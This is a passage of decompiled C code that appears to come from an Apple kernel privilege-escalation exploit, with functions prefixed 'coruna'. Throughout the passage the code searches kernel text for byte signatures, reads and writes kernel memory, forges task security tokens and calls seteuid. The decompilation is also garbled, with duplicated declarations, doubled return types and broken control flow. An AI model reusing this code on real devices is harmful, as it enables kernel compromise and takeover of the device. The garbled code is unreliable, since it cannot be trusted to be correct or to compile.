                        return 0;
                      }
                      ptr = _calloc(0x128,1);
                      if (ptr == (void *)0x0) {
                        return 0;
                      }
                      coruna_ctx_clear_1090c(ptr,handle);
                      size = *(uint64_t *)(handle + 0x140);
                      type_id_11 = *(uint64_t *)(handle + 0x158);
                      type_id_10 = *(uint64_t *)(handle + 0x150);
                      *(uint64_t *)((long)ptr + 0x78) = *(uint64_t *)(handle + 0x148);
                      *(uint64_t *)((long)ptr + 0x70) = size;
                      *(uint64_t *)((long)ptr + 0x88) = type_id_11;
                      *(uint64_t *)((long)ptr + 0x80) = type_id_10;
                      *(uint64_t *)((long)ptr + 0x90) = *(uint64_t *)(handle + 0x160);
                      *(uint32_t *)((long)ptr + 0x98) = *(uint32_t *)(handle + 0x178);
                      *(uint32_t *)((long)ptr + 0x38) = *(uint32_t *)(handle + 0x180);
                      err = coruna_call_find_text_exec(ptr,0,addr,0);
                      if (err == 0) {
                        return 0;
                      }
                      *(void **)(&k_kernel_slot_1d30 + handle) = ptr;
                      coruna_macho_text_sect(serial_buf,ptr);
                      addr = coruna_strsep(serial_buf,"68 02 08 CB 1F 20 03 D5",0,1);
                      if (addr == 0) {
                      return 0;
                      }
                      off = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + -8);
                      if (off == 0) {
                      return 0;
                      }
                      off = coruna_kernel_remote_trampoline(*(uint64_t *)(&k_kernel_slot_1d30 + handle),off);
                      base = coruna_ptr_canonicalize(handle,off);
                      if (base == 0) {
                      return 0;
                      }
                      addr = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + 4);
                      if (addr == 0) {
                      return 0;
                      }
                      addr = coruna_kernel_remote_trampoline(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr);
                      if (addr == 0) {
                      return 0;
                      }
                      addr = off + ((unsigned long)(scratch - addr) >> 10 & 0x3ffffffffffff0) + 9;
                      err = coruna_nop_stub_6(handle,addr,1,&action);
                      if (err == 0) {
                      return 0;
                      }
                      if ((action & 1) == 0) {
                      action = action | 1;
                      err = coruna_vm_deallocate_f7f8(handle,addr,&action,1);
                      if (err == 0) {
                      return 0;
                      }
                      }
                      }
                      }
                      size = coruna_kernel6544_residual_256(handle,handle + 0xb0,serial_buf);
                      if ((int)size == 0) {
                      return size;
                      }
                      handle = coruna_ptr_canonicalize(handle,serial_buf[0]);
                      if (handle == 0) {
                      return 0;
                      }
                      size = coruna_nop_stub_6(handle,serial_buf[0] + 0x20,1,&stack_guard);
                      if ((int)size == 0) {
                      return size;
                      }
                      thread_attr = (uint8_t)arg;
                      if (stack_guard != tag) {
                      size = coruna_vm_deallocate_f7f8(handle,serial_buf[0] + 0x20,&thread_attr,1);
                      err = (int)size;
                      joined_r0x00033558:
                      if (err == 0) {
                      return size;
                    }
                    type_id_8 = type_id_8 + *(uint *)(handle + 0x180);
                  } while (type_id_8 < type_id_9);
                }
              }
              type_id = type_id + 1;
            } while (type_id < *(uint *)(&k_kernel_slot_18a0 + handle));
          }
          return 0;
        }
cleanup:
        coruna_macho_text_sect(serial_buf,ptr);
        addr = coruna_strsep(serial_buf,"68 02 08 CB 1F 20 03 D5",0,1);
        if (addr == 0) {
          return 0;
        }
        off = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + -8);
        if (off == 0) {
          return 0;
        }
        off = coruna_kernel_remote_trampoline(*(uint64_t *)(&k_kernel_slot_1d30 + handle),off);
        base = coruna_ptr_canonicalize(handle,off);
        if (base == 0) {
          return 0;
        }
        addr = coruna_return_zero_1555c_stub(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr + 4);
        if (addr == 0) {
          return 0;
        }
        addr = coruna_kernel_remote_trampoline(*(uint64_t *)(&k_kernel_slot_1d30 + handle),addr);
        if (addr == 0) {
          return 0;
        }
        addr = off + ((unsigned long)(scratch - addr) >> 10 & 0x3ffffffffffff0) + 9;
        err = coruna_nop_stub_6(handle,addr,1,&action);
        if (err == 0) {
          return 0;
        }
        if ((action & 1) == 0) {
          action = action | 1;
          err = coruna_vm_deallocate_f7f8(handle,addr,&action,1);
          if (err == 0) {
            return 0;
          }
        }
      }
    }
    size = coruna_kernel6544_residual_256(handle,handle + 0xb0,serial_buf);
    if ((int)size == 0) {
      return size;
    }
    handle = coruna_ptr_canonicalize(handle,serial_buf[0]);
    if (handle == 0) {
      return 0;
    }
    size = coruna_nop_stub_6(handle,serial_buf[0] + 0x20,1,&stack_guard);
    if ((int)size == 0) {
      return size;
    }
    thread_attr = (uint8_t)arg;
    if (stack_guard != tag) {
      size = coruna_vm_deallocate_f7f8(handle,serial_buf[0] + 0x20,&thread_attr,1);
      err = (int)size;
joined_r0x00033558:
      if (err == 0) {
        return size;
      }
    }
  }
  if (*(double *)k_kernel_dyldversionnumber_slot < k_kernel_rodata_word_3b800) {
    return 1;
  }
  size = coruna_kernel6544_via_return_zero_2cd88_2(handle,val,arg);
  err = (int)size;
joined_r0x0003375c:
  if (err != 0) {
    return 1;
  }
  return size;
}





uint64_t coruna_kernel6544_via_return_zero_2cd88_2(uint64_t val,uint64_t id_2,int flags)
{
  long handle;
  uint64_t u;
  uint size;
  uint scratch;
  
  handle = coruna_return_zero_2cd88();
  u = 0;
  if ((handle != 0) && (u = coruna_kernel6544_via_fcntl_1bf84(val,handle,&scratch), (int)u != 0)) {
    size = 0x80;
    if (flags == 0) {
      size = 0;
    }
    if (((scratch & 0xffffff7f | size) == scratch) ||
       (u = coruna_kernel6544_via_mach_vm_machine_attribute(val,handle), (int)u != 0)) {
      u = 1;
    }
  }
  return u;
}





uint64_t
void coruna_return_zero_33874(long handle,uint64_t val,uint8_t *buf,uint8_t *data_2,
            uint8_t *bytes_3)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  char scratch;
  long bootargs;
  uint thread_attr;
  
  thread_attr = 0;
  handle = coruna_kernel6544_via_return_zero_2c3b8_2();
  if (handle == 0) {
    return 0;
  }
  err = coruna_ctx_test_flag(handle,0x20);
  if (err != 0) {
    err = coruna_kernel6544_residual_256(handle,handle + 0xb0,&bootargs);
    if (err == 0) {
      return 0;
    }
    handle = coruna_ptr_canonicalize(handle,bootargs);
    if (handle == 0) {
      return 0;
    }
    err = coruna_nop_stub_6(handle,bootargs + 0x20,1,&scratch);
    if (err == 0) {
      return 0;
    }
    *data_2 = scratch != '\0';
    *bytes_3 = 0;
    *buf = 1;
    return 1;
  }
  err = coruna_ctx_test_flag(handle,0x5184001);
  if (err == 0) {
    err = coruna_ctx_test_flag(handle,0x200);
    if (err == 0) {
      return 0;
    }
    err = *(int *)(handle + 0x140);
    if (err < 0x2258) {
      if (err < 0x1f53) {
        if (err < 0x1c1b) {
          if (err < 0x1809) {
            return 0;
          }
          off = 0xe7;
          if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
            off = 0xef;
          }
        }
        else {
          off = 0xdf;
        }
      }
      else {
        off = 0x97;
      }
    }
    else {
      off = 0x8f;
    }
    err = coruna_nop_stub_6(handle,off + handle,1,&thread_attr);
    if (err != 0) {
      *bytes_3 = (char)thread_attr != '\0';
      *data_2 = 0;
      *buf = 0;
      return 1;
    }
    return 0;
  }
  err = *(int *)(handle + 0x140);
  if (err < 0x2712) {
    if (err < 0x2258) {
      if (0x1f52 < err) {
        u = 0x180000;
        err = coruna_ctx_test_flag(handle,u);
        err = err == 0;
        addr = 199;
        off = 0xbf;
        }
        if (!err) {
        off = addr;
        }
        done:
        err = coruna_kernel6544_via_fcntl_1bf84(handle,off + handle,&thread_attr);
        if (err == 0) {
        return 0;
      }
      if (err < 0x1c1b) {
        off = 0x107;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
          off = 0x10f;
        }
        err = coruna_kernel6544_via_fcntl_1bf84(handle,off + handle,&thread_attr);
        if (err == 0) {
        return 0;
        }
        size = *(unsigned long *)(handle + 0x158);
        *bytes_3 = (thread_attr & 0xff) != 0;
        if (size < 0x1c1b0a80100000) {
        *buf = (thread_attr & 0xff00) != 0;
        thread_attr = thread_attr & 0xff0000;
        }
        else {
        *buf = (thread_attr & 0xff0000) != 0;
        thread_attr = thread_attr >> 0x18;
        }
        *data_2 = thread_attr != 0;
        return 1;
      }
      err = coruna_ctx_test_flag(handle,0x80000);
      err = err == 0;
      addr = 0x107;
      off = 0xff;
    }
    else {
      err = coruna_ctx_test_flag(handle,0x1180000);
      err = err == 0;
      addr = 0xbf;
      off = 0xb7;
    }
  }
  else {
    u = 0x1180000;
fail:
    err = coruna_ctx_test_flag(handle,u);
    err = err == 0;
    addr = 199;
    off = 0xbf;
  }
  if (!err) {
    off = addr;
  }
done:
  err = coruna_kernel6544_via_fcntl_1bf84(handle,off + handle,&thread_attr);
  if (err == 0) {
    return 0;
  }
  size = *(unsigned long *)(handle + 0x158);
  *bytes_3 = (thread_attr & 0xff) != 0;
  if (size < 0x1c1b0a80100000) {
    *buf = (thread_attr & 0xff00) != 0;
    thread_attr = thread_attr & 0xff0000;
  }
  else {
    *buf = (thread_attr & 0xff0000) != 0;
    thread_attr = thread_attr >> 0x18;
  }
  *data_2 = thread_attr != 0;
  return 1;
}





unsigned long coruna_set_task_token(uint *arg,uint64_t val,uint64_t n)

{
  host_security_t host_security;
  bool i;
  uint8_t *buf;
  kern_return_t lk3;
  int idx;
  long serial_11;
  unsigned long type_id_15;
  long serial_12;
  long serial_13;
  long addr;
  uint32_t type_id_18;
  host_t host;
  uid_t kind;
  host_t cache_65;
  audit_token_t cache_31;
  mach_msg_type_number_t cache_56;
  uint32_t cache_59;
  uint cache_57 [2];
  uint cache_58 [2];
  uint cache_43 [2];
  uint cache_32 [2];
  security_token_t cache_45;
  uint32_t cache_21;
  uid_t cache_54;
  task_t task;
  
  task = (task_t)val;
  lk3 = _task_get_special_port(task,2,&cache_65);
  buf = k_kernel_mach_task_self_slot;
  if (lk3 != 0) {
    return 0;
  }
  host = (host_t)n;
  if (cache_65 == host) {
    return 1;
  }
  if ((*arg & 0x5584001) == 0) {
    type_id_15 = coruna_iosurface_field_read(arg);
    if ((int)type_id_15 == 0) {
      return type_id_15;
    }
    serial_11 = coruna_kernel6544_via_return_zero_2b000(arg,val);
    if (serial_11 == 0) {
      return 0;
    }
    serial_11 = serial_11 + (type_id_15 & 0xffffffff);
    type_id_15 = coruna_kernel6544_residual_256(arg,serial_11,cache_57);
    if ((int)type_id_15 == 0) {
      return type_id_15;
    }
    serial_12 = coruna_ptr_canonicalize(arg,cache_57);
    if (serial_12 != 0) {
      if (host + 1 < 2) {
        serial_12 = -(unsigned long)(host == 0xffffffff);
      }
      else {
        serial_12 = coruna_ret_stub_3(arg,n);
        if (serial_12 == 0) {
          return 0;
        }
        idx = coruna_kernel6544_via_kernel6544_via_kernel6544_via_fcntl_1bf84_2(arg,serial_12);
        if (idx != 0) {
          return 0;
        }
      }
      idx = coruna_call_mach_vm_machine_attribute_29df8(arg,serial_11,serial_12);
      return (unsigned long)(idx != 0);
    }
    return 0;
  }
  if (*(unsigned long *)(arg + 0x56) < 0x1f530000000000) {
    host_security = arg[0x649];
    cache_56 = 2;
    lk3 = _task_info(task,0xd,(task_info_t)&cache_45,&cache_56);
    if (lk3 == 0) {
      cache_56 = 8;
      lk3 = _task_info(task,0xf,(task_info_t)cache_57,&cache_56);
      if (lk3 == 0) {
        cache_31.val[2] = cache_58[0];
        cache_31.val[3] = cache_58[1];
        cache_31.val[0] = cache_57[0];
        cache_31.val[1] = cache_57[1];
        cache_31.val[6] = cache_32[0];
        cache_31.val[7] = cache_32[1];
        cache_31.val[4] = cache_43[0];
        cache_31.val[5] = cache_43[1];
        lk3 = _host_security_set_task_token(host_security,task,cache_45,&cache_31,host);
        return (unsigned long)(lk3 == 0);
      }
    }
  }
  else if (*(task_t *)k_kernel_mach_task_self_slot == task) {
    cache_31.val[0] = 2;
    lk3 = _task_info(task,0xd,(task_info_t)&cache_45,cache_31.val);
    if (lk3 == 0) {
      cache_31.val[0] = 8;
      lk3 = _task_info(task,0xf,(task_info_t)cache_57,cache_31.val);
      if (lk3 == 0) {
        serial_11 = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_3(arg,val);
        if (serial_11 == 0) {
          return 0;
        }
        type_id_15 = coruna_kernel6544_via_fcntl_1bf84_2(arg,serial_11,&cache_31);
        if ((int)type_id_15 == 0) {
          return type_id_15;
        }
        serial_12 = coruna_kernel6544_via_ctx_test_flag_5(arg,cache_31.val);
        serial_13 = coruna_ptr_canonicalize(arg,serial_12);
        if (serial_13 == 0) {
          return 0;
        }
        serial_13 = serial_12 + 0x18;
        type_id_15 = coruna_kernel6544_via_fcntl_1bf84(arg,serial_13,&cache_54);
        if ((int)type_id_15 == 0) {
          return type_id_15;
        }
        if ((0x1f530f027fffff < *(unsigned long *)(arg + 0x56)) &&
           (type_id_15 = coruna_kernel6544_via_fcntl_1bf84(arg,serial_12 + 0x20,&cache_21), (int)type_id_15 == 0)) {
          return type_id_15;
        }
        if (arg[0x648] == host) {
          kind = 0;
          type_id_15 = *(unsigned long *)(arg + 0x56);
          i = 0x1f530f027fffff < type_id_15 && cache_54 == 0;
          type_id_18 = 0x1f5;
          if (0x1f530f027fffff >= type_id_15 || cache_54 != 0) {
            type_id_18 = 0;
          }
        }
        else {
          if (arg[0x64a] != host) {
            return 0;
          }
          type_id_18 = 0;
          type_id_15 = *(unsigned long *)(arg + 0x56);
          i = 0x1f530f027fffff < type_id_15 && cache_54 != 0;
          kind = cache_54;
        }
        if ((cache_54 != kind) || (i)) {
          if (type_id_15 < 0x1f530f02800000) {
            type_id_15 = coruna_mach_vm_machine_attribute(arg,serial_13,kind);
            idx = (int)type_id_15;
          }
          else {
            if ((i) && (type_id_15 = coruna_kernel6544_via_mach_vm_machine_attribute(arg,serial_13,type_id_18), (int)type_id_15 == 0)) {
              return type_id_15;
            }
            type_id_15 = coruna_kernel6544_via_mach_vm_machine_attribute(arg,serial_12 + 0x20,kind);
            idx = (int)type_id_15;
          }
          if (idx == 0) {
            return type_id_15;
          }
        }
        type_id_15 = coruna_kernel6544_via_kernel6544_via_return_zero_2b000_5(arg,*(uint32_t *)buf);
        if ((int)type_id_15 == 0) {
          return type_id_15;
        }
        if ((*(unsigned long *)(arg + 0x56) < 0x1f530f02800000) ||
           (idx = coruna_kernel6544_via_return_zero_2e5d4(arg,serial_12), idx == 0)) {
          addr = coruna_ptr_canonicalize(arg,*(uint64_t *)(arg + 0xe6));
          if ((addr != 0) && (type_id_15 = coruna_pthread_attr_setdetachstate(arg,arg[0xdf],0), (int)type_id_15 == 0)) {
            return type_id_15;
          }
          idx = _seteuid(kind);
          if ((idx == 0) &&
             ((*(unsigned long *)(arg + 0x56) < 0x1f530f02800000 ||
              ((idx = coruna_kernel6544_via_fcntl_1bf84_2(arg,serial_11,&cache_56), idx != 0 &&
               ((coruna_u64_pack((cache_59), (cache_56)) == cache_31.val ||
                (idx = coruna_kernel6544_via_mach_vm_machine_attribute_29df8(arg,serial_11), idx != 0)))))))) {
            serial_11 = coruna_ptr_canonicalize(arg,*(uint64_t *)(arg + 0xe6));
            if ((serial_11 != 0) &&
               (type_id_15 = coruna_pthread_attr_setdetachstate(arg,arg[0xdf],*(uint64_t *)(arg + 0xea)),
               (int)type_id_15 == 0)) {
              return type_id_15;
            }
            if (cache_54 != kind || i) {
              if (*(unsigned long *)(arg + 0x56) < 0x1f530f02800000) {
                type_id_15 = coruna_mach_vm_machine_attribute(arg,serial_13);
                idx = (int)type_id_15;
              }
              else {
                if ((i) && (type_id_15 = coruna_kernel6544_via_mach_vm_machine_attribute(arg,serial_13), (int)type_id_15 == 0)) {
                  return type_id_15;
                }
                type_id_15 = coruna_kernel6544_via_mach_vm_machine_attribute(arg,serial_12 + 0x20,cache_21);
                idx = (int)type_id_15;
              }
              if (idx == 0) {
                return type_id_15;
              }
            }
            idx = coruna_task_info_2e7d8(arg,val,1,&cache_45,8);
            if ((idx != 0) && (idx = coruna_task_info_2e7d8(arg,val,3,cache_57,0x20), idx != 0))
            {
              return 1;
            }
          }
        }
      }
    }
  }
  return 0;
}





void coruna_call_mach_port_mod_refs_30670(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_mach_port_mod_refs_30670(val,id_2,0,size_3);
  return;
}





bool coruna_mach_port_mod_refs_30670(long handle,uint64_t val,long addr_2,ipc_space_t *arg)
{
  ipc_space_t task;
  pid_t lp1;
  kern_return_t lk2;
  int err;
  long handle;
  unsigned long u;
  long addr;
  uint64_t scratch;
  
  if ((0 < (int)val) && (lp1 = _getpid(), lp1 == (int)val)) {
    task = *(ipc_space_t *)k_kernel_mach_task_self_slot;
    lk2 = _mach_port_mod_refs(task,task,0,1);
    if (lk2 != 0) {
      return false;
    }
    *arg = task;
    return true;
  }
  err = *(int *)(&k_kernel_slot_191c + handle);
  if (err == 0) {
    err = *(int *)(&k_kernel_slot_1918 + handle);
  }
  handle = coruna_kernel6544_via_return_zero_2b000(handle,err);
  if (handle != 0) {
    if (addr_2 == 0) {
      handle = coruna_call_macho_data_seg_2bb24(handle,handle,val);
    }
    else {
      handle = coruna_call_macho_data_seg_2bb24_2bdb4(handle,handle,addr_2);
    }
    if (handle != 0) {
      err = *(int *)(handle + 0x140);
      if (err < 0x2258) {
        if (err - 0x1f53U < 2) {
          u = 0x1f530f027fffff;
          addr = 0xd0;
        }
        else {
          u = 0x1c1b19145fffff;
          addr = 0xf0;
          if ((err != 0x1809) && (err != 0x1c1b)) {
            return false;
          }
        }
        if (*(unsigned long *)(handle + 0x158) <= u) {
          addr = 0xf8;
        }
      }
      else {
        addr = 200;
        if (((err != 0x2258) && (err != 0x225c)) && (err != 0x2712)) {
          return false;
        }
      }
      err = coruna_kernel6544_residual_256(handle,addr + handle,&scratch);
      if ((err != 0) && (handle = coruna_ptr_canonicalize(handle,scratch), handle != 0)) {
        err = coruna_arc4random_buf(handle,scratch,arg);
        return err == 0;
      }
    }
  }
  return false;
}





bool coruna_mach_thread_self_30818(uint *size,int flags,uint64_t val,uint64_t id_2,uint64_t size_3
                 ,uint64_t off_4)
{
  long handle;
  uint u;
  bool err;
  int err;
  mach_port_t lm5;
  int status;
  long addr;
  uint size;
  uint version;
  unsigned long port;
  uint32_t tag;
  uint kind;
  long scratch;
  long bootargs;
  uint thread_attr;
  
  if ((*(unsigned long *)(size + 0x56) < 0x1c1b0002e00000) ||
     ((*size & 0x5584001) == 0 || *(int *)k_kernel_mach_task_self_slot == flags)) {
    err = coruna_thread_set_state(size,val,id_2,size_3,off_4);
fail:
    err = err == 0;
  }
  else {
    thread_attr = 0;
    size = size[0x50];
    if ((int)size < 0x2258) {
      if (size - 0x1f53 < 2) {
done:
        err = coruna_ctx_test_flag(size,0x4000000);
        if (err == 0) {
          err = coruna_ctx_test_flag(size,0x1100000);
          if (err == 0) {
            err = coruna_ctx_test_flag(size,0x84000);
            if (err == 0) {
              err = coruna_ctx_test_flag(size,1);
              size = 0;
              if (err != 0) {
                size = 0x160;
              }
            }
            else {
              size = 0x168;
            }
          }
          else {
            size = 0x170;
          }
        }
        else {
          size = 0x1c0;
        }
        if ((int)size[0x50] < 0x2258) goto cleanup;
        size = size - 8;
        err = coruna_ctx_test_flag(size,1);
        if (err == 0) {
          err = coruna_ctx_test_flag(size,0x4000000);
          version = 0xec;
          if (err != 0) {
            version = 0x13c;
          }
          tag = 4;
          kind = 2;
        }
        else {
          tag = 4;
          kind = 2;
          version = 0xe4;
        }
      }
      else {
        if (size != 0x1c1b) goto check_ok;
        err = coruna_ctx_test_flag(size,0x80000);
        if (err == 0) {
          err = coruna_ctx_test_flag(size,0x4000);
          if (err != 0) {
            port = *(unsigned long *)(size + 0x56);
            version = 0x510;
            goto skip;
          }
          err = coruna_ctx_test_flag(size,1);
          if (err == 0) {
            size = 0;
            goto cleanup;
          }
          port = *(unsigned long *)(size + 0x56);
          version = 0x508;
          size = 0x160;
        }
        else {
          port = *(unsigned long *)(size + 0x56);
          version = 0x518;
skip:
          size = 0x168;
        }
        if (port < 0x1c1b1914600000) {
          size = version;
        }
cleanup:
        version = size - 9;
        kind = 1;
        tag = 1;
      }
      if (size != 0) {
        lm5 = _mach_thread_self();
        addr = coruna_kernel6544_via_return_zero_2b000(size,lm5);
        if (addr != 0) {
          bootargs = 0;
          err = coruna_nop_stub_6(size,addr + (unsigned long)size,8,&bootargs);
          if (((err != 0) &&
              (err = coruna_nop_stub_6(size,addr + (unsigned long)version,tag,&thread_attr), u = thread_attr
              , err != 0)) && (addr = coruna_kernel6544_via_return_zero_2b000(size,val), addr != 0)) {
            scratch = 0;
            handle = addr + (unsigned long)size;
            err = coruna_nop_stub_6(size,handle,8,&scratch);
            if (err != 0) {
              addr = addr + (unsigned long)version;
              err = coruna_nop_stub_6(size,addr,tag,&thread_attr);
              size = thread_attr;
              if ((err != 0) &&
                 ((bootargs == scratch ||
                  (err = coruna_nop_stub_7(size,handle,&bootargs,8), err != 0)))) {
                if (((u & kind) == 0) || ((size & kind) != 0)) {
                  err = coruna_thread_set_state(size,val,id_2,size_3,off_4);
next:
                  if ((bootargs == scratch) ||
                     (status = coruna_nop_stub_7(size,handle,&scratch,8), status != 0))
                  goto fail;
                }
                else {
                  thread_attr = thread_attr & (kind ^ 0xffffffff) | u & kind;
                  err = coruna_nop_stub_7(size,addr,&thread_attr,tag);
                  if (err != 0) {
                    err = coruna_thread_set_state(size,val,id_2,size_3,off_4);
                    thread_attr = thread_attr & ~kind;
                    status = coruna_nop_stub_7(size,addr,&thread_attr,tag);
                    if (status != 0) goto next;
                  }
                }
              }
            }
          }
        }
      }
    }
    else if (((size == 0x2258) || (size == 0x225c)) || (size == 0x2712)) goto done;
check_ok:
    err = false;
  }
  return err;
}





kern_return_t
void coruna_thread_set_state(long handle,uint64_t val,thread_state_flavor_t arg,thread_state_t arg_x,
            mach_msg_type_number_t arg_x_x)
{
  int err;
  int status;
  kern_return_t lk3;
  long handle;
  long addr;
  ushort scratch;
  ushort bootargs;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x225c) {
    handle = 0;
fail:
    lk3 = _thread_set_state((thread_act_t)val,arg,arg_x,arg_x_x);
    if (err < 0x225c) {
      return lk3;
    }
    if (-1 < (short)bootargs) {
      coruna_nop_stub_7(handle,handle,&bootargs,2);
      return lk3;
    }
    return lk3;
  }
  status = coruna_ctx_test_flag(handle,0x4000000);
  if (status == 0) {
    status = coruna_ctx_test_flag(handle,0x5584201);
    addr = 0xb8;
    if (status != 0) {
      addr = 0x70;
    }
  }
  else {
    addr = 0xc0;
  }
  handle = coruna_kernel6544_via_return_zero_2b000(handle,val);
  if (handle != 0) {
    handle = handle + addr;
    status = coruna_nop_stub_6(handle,handle,2,&bootargs);
    if (status != 0) {
      if (-1 < (short)bootargs) {
        scratch = bootargs | 0x8000;
        status = coruna_nop_stub_7(handle,handle,&scratch,2);
        if (status == 0) {
          return 5;
        }
      }
      lk3 = _thread_set_state((thread_act_t)val,arg,arg_x,arg_x_x);
      if (err < 0x225c) {
      return lk3;
      }
      if (-1 < (short)bootargs) {
      coruna_nop_stub_7(handle,handle,&bootargs,2);
      return lk3;
      }
      return lk3;
    }
  }
  return 5;
}





uint64_t coruna_kernel6544_via_ctx_test_flag_12(long handle)
{
  bool err;
  int err;
  uint64_t u;
  int status;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    err = err - 0x1f53U < 2 || err == 0x1809;
    status = 0x1c1b;
  }
  else {
    err = err == 0x2258 || err == 0x2712;
    status = 0x225c;
  }
  u = 0;
  if (err || err == status) {
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,8);
      u = 0xfffffff007004000;
      if (err != 0) {
        u = 0xfffffe0007004000;
      }
    }
    else {
      u = 0xfffffff027004000;
    }
  }
  return u;
}
uint64_t coruna_kernel6544_via_kernel6544_via_fcntl_1bf84_6(long handle,int flags,uint size,char *path)
{
  int err;
  long handle;
  long addr;
  uint u;
  uint size;
  uint64_t version;
  long off;
  unsigned long port;
  int scratch;
  long bootargs;
  uint thread_attr;
  int host_info;
  long serial_buf;
  uint64_t action;
  uint64_t scratch;
  uint64_t block_ctx;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t stack_guard;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t sa_saved;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t tmp_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t region;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t plist;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t url_buf;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t json_buf;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t frame;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t work;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t cache;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t cache_20;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache_21;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_22;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_47;
  long cache_23;
  
  cache_23 = *(long *)k_kernel_stack_chk_guard_slot;
  version = 0x2800f;
  serial_buf = 0;
  handle = coruna_kernel6544_via_return_zero_2b000();
  bootargs = 0;
  if (handle == 0) {
    version = 0x2800e;
    if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
    ___stack_chk_fail();
    }
    return version;
  }
  port = *(unsigned long *)(handle + 0x158);
  err = *(int *)(handle + 0x140);
  if (0x1f530f027fffff < port) {
    scratch = 0;
    if ((err == 0x2258 || err == 0x2712) || err == 0x225c) {
      scratch = 0x48;
    }
    port = coruna_return_zero_2b7a0(handle);
    err = coruna_kernel6544_residual_256(handle,handle + (port & 0xffffffff),&bootargs);
    if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
    ___stack_chk_fail();
    }
    return version;
  }
  if (err == 0x1f53) {
    err = coruna_ctx_test_flag(handle,0x100000);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5584001);
      u = 0x3d0;
      if (err != 0) {
        u = 1000;
      }
    }
    else {
      u = 0x3f8;
    }
  }
  else {
    if (err != 0x1c1b) {
      version = 0x28007;
      if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
      ___stack_chk_fail();
      }
      return version;
    }
    err = coruna_ctx_test_flag(handle,0x5584001);
    u = 0x3c0;
    if (err != 0) {
      u = 0x3d0;
    }
    size = 0x3c8;
    if (err != 0) {
      size = 0x3e0;
    }
    if (0x1c1b19145fffff < port) {
      u = size;
    }
  }
  off = handle + (unsigned long)u;
  err = coruna_kernel6544_residual_256(handle,off,&serial_buf);
  if (*(long *)k_kernel_stack_chk_guard_slot != cache_23) {
  ___stack_chk_fail();
  }
  return version;
}





uint64_t coruna_kernel6544_via_kernel6544_via_return_zero_2e7b0(long handle,uint64_t val)
{
  int err;
  int status;
  long handle;
  unsigned long u;
  long addr;
  uint64_t size;
  uint64_t version;
  long scratch;
  uint32_t bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  uint64_t stack_guard;
  uint64_t path_buf;
  uint64_t sa_saved;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t sa_new;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t path_buf;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t tmp_buf;
  uint64_t cache_21;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t region;
  uint64_t cache_24;
  uint64_t cache_25;
  uint64_t cache_26;
  uint64_t plist;
  uint64_t cache_27;
  uint64_t cache_28;
  uint64_t cache_29;
  uint64_t url_buf;
  uint64_t cache_30;
  uint64_t cache_31;
  uint64_t cache_32;
  uint64_t json_buf;
  uint64_t cache_33;
  uint64_t cache_34;
  uint64_t cache_35;
  uint64_t frame;
  uint64_t cache_36;
  uint64_t cache_37;
  uint64_t cache_38;
  uint64_t work;
  uint64_t cache_39;
  uint64_t cache_40;
  uint64_t cache_41;
  uint64_t cache;
  uint64_t cache_42;
  uint64_t cache_43;
  uint64_t cache_44;
  uint64_t cache_20;
  uint64_t cache_45;
  uint64_t cache_46;
  uint64_t cache_47;
  long cache_21;
  uint64_t cache_48;
  uint64_t cache_49;
  uint64_t cache_50;
  uint64_t cache_22;
  uint64_t cache_51;
  uint64_t cache_52;
  uint64_t cache_53;
  uint64_t cache_23;
  uint64_t cache_54;
  uint64_t cache_55;
  uint64_t cache_56;
  uint64_t cache_24;
  uint64_t cache_57;
  uint64_t cache_58;
  uint64_t cache_59;
  long cache_25;
  
  cache_25 = *(long *)k_kernel_stack_chk_guard_slot;
  size = 0x28010;
  scratch = 0;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
